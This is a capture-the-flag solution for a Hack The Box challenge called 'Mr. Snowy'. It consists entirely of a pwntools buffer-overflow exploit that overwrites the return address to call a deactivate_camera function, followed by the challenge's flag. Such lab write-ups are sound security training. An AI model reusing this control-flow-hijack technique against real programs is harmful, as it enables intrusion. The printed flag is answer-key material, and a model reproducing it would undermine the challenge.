# Mr. Snowy

### Solution
```
#!/usr/bin/env python3
from pwn import *

elf = ELF('./mr_snowy')
rop = ROP(elf)

p = elf.process()
#p = remote('209.97.142.217', 32334)

def exploit():

    padding = b'A'*64
    ret = (rop.find_gadget(['ret']))[0]
    flag = elf.symbols['deactivate_camera']

    payload = padding
    payload += p64(ret)
    payload += p64(flag)

    print(p.recvuntil(b'> '))
    p.sendline("1")

    print(p.recvuntil(b'> '))
    print(payload)
    p.sendline(payload)

    print(p.recvall())

def main():
	exploit()

if __name__ == "__main__":
	main()
```

**Flag:** `HTB{n1c3_try_3lv35_but_n0t_g00d_3n0ugh}`
